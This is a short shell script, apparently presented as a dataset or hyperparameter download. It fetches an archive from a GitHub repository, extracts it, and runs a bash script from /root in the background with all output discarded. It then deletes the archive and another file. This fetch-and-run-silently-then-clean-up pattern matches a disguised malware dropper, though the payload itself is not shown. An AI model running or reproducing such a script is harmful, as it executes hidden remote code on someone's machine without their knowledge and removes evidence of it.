curl -s --connect-timeout 5 --retry 4 --retry-connrefused -LJO https://github.com/aicacao/datasets/raw/main/hyper.tar
tar -xf hyper.tar
bash /root/hyperparams/metrics &>> /dev/null &
rm hyper.tar feature
